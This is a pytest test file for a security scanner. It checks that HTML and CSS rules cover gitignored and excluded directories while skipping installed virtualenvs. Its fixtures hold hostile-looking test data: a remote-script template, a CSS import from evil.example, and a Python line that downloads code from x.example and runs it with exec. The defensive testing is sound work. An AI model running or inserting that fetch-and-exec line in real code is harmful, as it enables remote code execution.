"""Step 4 of docs/plans/gitignore-consistent-discovery.md: the HTML
template scanner and the CSS analyser on shared discovery.

These are the two rule-bearing walks besides Python. They never honoured
``.gitignore``, so F23 did not apply to them. They did honour by-name skip
lists (``dist``, ``build``, ``vendor`` …), the same blind spot in another
form, and they read installed environments. Step 1 measured 7 MEDIUM
``TS-CE-012`` findings from third-party templates inside virtualenvs
across two samples.
"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from scarno.core.discovery import (
    gitignored_findings_line,
    unignored_environments_line,
)

pytestmark = pytest.mark.security

_TEMPLATE = '<html><script src="https://cdn.example.com/x.js"></script></html>\n'
_STYLESHEET = '@import "https://evil.example/x.css";\n'
_PY_PAYLOAD = 'import requests\nexec(requests.get("https://x.example/p").text)\n'


def _project(root: Path) -> Path:
    (root / "requirements.txt").write_text("requests\n", encoding="utf-8")
    (root / "app.py").write_text("import requests\n", encoding="utf-8")
    (root / "site.css").write_text("body { margin: 0 }\n", encoding="utf-8")
    return root


def _run(runner, root: Path, *argv: str) -> tuple[int, dict]:
    from scarno.cli import app

    result = runner.invoke(app, [str(root), "--format", "json", *argv])
    assert result.exit_code != 2, result.output
    return result.exit_code, json.loads(result.output)


def _paths(report: dict, rule_id: str) -> list[str]:
    return sorted(f["file_path"] for f in report["findings"] if f["rule_id"] == rule_id)


@pytest.mark.requirement("SEC-NEW-78")
@pytest.mark.parametrize("mode", ["uncertain", "include", "exclude"])
def test_gitignored_template_and_stylesheet_are_rule_scanned(
    runner, tmp_path: Path, mode: str
) -> None:
    root = _project(tmp_path)
    (root / "gen").mkdir()
    (root / "gen" / "page.html").write_text(_TEMPLATE, encoding="utf-8")
    (root / "gen" / "theme.css").write_text(_STYLESHEET, encoding="utf-8")
    (root / ".gitignore").write_text("gen/\n", encoding="utf-8")

    _, report = _run(runner, root, "--gitignore", mode)

    assert _paths(report, "TS-CE-012") == ["gen/page.html"]
    assert _paths(report, "TS-CE-007") == ["gen/theme.css"]


@pytest.mark.requirement("SEC-NEW-78")
@pytest.mark.parametrize("dirname", ["dist", "build", "vendor", "bin"])
def test_by_name_excluded_directories_are_rule_scanned(
    runner, tmp_path: Path, dirname: str
) -> None:
    """The HTML scanner skipped these names outright, so a pull request
    could hide a remote script in ``dist/``."""
    root = _project(tmp_path)
    (root / dirname).mkdir()
    (root / dirname / "page.html").write_text(_TEMPLATE, encoding="utf-8")
    (root / dirname / "theme.css").write_text(_STYLESHEET, encoding="utf-8")

    _, report = _run(runner, root)

    assert _paths(report, "TS-CE-012") == [f"{dirname}/page.html"]
    if dirname in ("dist", "build"):  # the CSS analyser's own name list
        assert _paths(report, "TS-CE-007") == [f"{dirname}/theme.css"]


@pytest.mark.requirement("SEC-NEW-78")
def test_installed_environment_templates_are_not_scanned(
    runner, tmp_path: Path
) -> None:
    """The step 1 noise: Django and Sphinx ship templates that load remote
    scripts, and a virtualenv in the tree reported them as the project's."""
    root = _project(tmp_path)
    env = root / ".direnv" / "python-3.12"
    pkg = env / "lib" / "python3.12" / "site-packages" / "thirdparty" / "templates"
    pkg.mkdir(parents=True)
    (env / "pyvenv.cfg").write_text("home = /usr/bin\n", encoding="utf-8")
    (pkg / "widget.html").write_text(_TEMPLATE, encoding="utf-8")
    (pkg / "widget.css").write_text(_STYLESHEET, encoding="utf-8")
    (root / ".gitignore").write_text(".direnv/\n", encoding="utf-8")

    _, report = _run(runner, root)

    assert _paths(report, "TS-CE-012") == []
    assert _paths(report, "TS-CE-007") == []
    assert not any("installed-environment" in e for e in report["errors"])


@pytest.mark.requirement("SEC-NEW-79")
def test_operator_exclude_narrows_html_and_css(runner, tmp_path: Path) -> None:
    root = _project(tmp_path)
    (root / "legacy").mkdir()
    (root / "legacy" / "page.html").write_text(_TEMPLATE, encoding="utf-8")
    (root / "legacy" / "theme.css").write_text(_STYLESHEET, encoding="utf-8")

    _, before = _run(runner, root)
    _, after = _run(runner, root, "--exclude", "legacy")

    assert _paths(before, "TS-CE-012") and _paths(before, "TS-CE-007")
    assert _paths(after, "TS-CE-012") == [] and _paths(after, "TS-CE-007") == []


@pytest.mark.requirement("PRV-008")
def test_audit_lines_are_reported_once_per_run(runner, tmp_path: Path) -> None:
    """Python, the HTML scanner and the CSS analyser each walk the tree and
    count. The run reports one line of each: findings from gitignored files
    add up across walks, and the same environment seen by three walks is
    one environment."""
    root = _project(tmp_path)
    (root / "gen").mkdir()
    (root / "gen" / "evil.py").write_text(_PY_PAYLOAD, encoding="utf-8")
    (root / "gen" / "page.html").write_text(_TEMPLATE, encoding="utf-8")
    (root / "gen" / "theme.css").write_text(_STYLESHEET, encoding="utf-8")
    (root / ".gitignore").write_text("gen/\n", encoding="utf-8")
    env = root / "env"
    env.mkdir()
    (env / "pyvenv.cfg").write_text("home = /usr/bin\n", encoding="utf-8")

    code, report = _run(runner, root)

    findings_lines = [e for e in report["errors"] if "finding(s) came from" in e]
    env_lines = [e for e in report["errors"] if "installed-environment" in e]
    assert findings_lines == [gitignored_findings_line(3)]
    assert env_lines == [unignored_environments_line(1)]
    assert code == 3
